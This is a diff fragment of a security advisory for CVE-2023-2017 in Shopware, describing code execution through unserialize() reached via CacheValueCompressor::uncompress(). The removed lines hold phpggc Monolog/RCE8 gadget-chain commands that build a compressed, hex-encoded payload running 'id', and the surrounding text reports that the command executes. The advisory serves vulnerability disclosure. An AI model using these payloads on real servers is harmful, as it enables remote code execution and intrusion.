@@ -201,15 +201,6 @@ For simplicity, the following proof-of-concept uses the administrator account to
 Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
 Serialized payload generated using the phpggc tool: 
 
-```
-./phpggc -b Monolog/RCE8 system 'id'
-```
-Compressed payload is generated using: 
-
-```
-php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"' 
-```
-
 4. In the right-sidebar, click the Show Preview button. Observe that the id shell command is executed successfully:
 ![img](https://starlabs.sg/advisories/23/images/CVE-2023-2017.png)
 
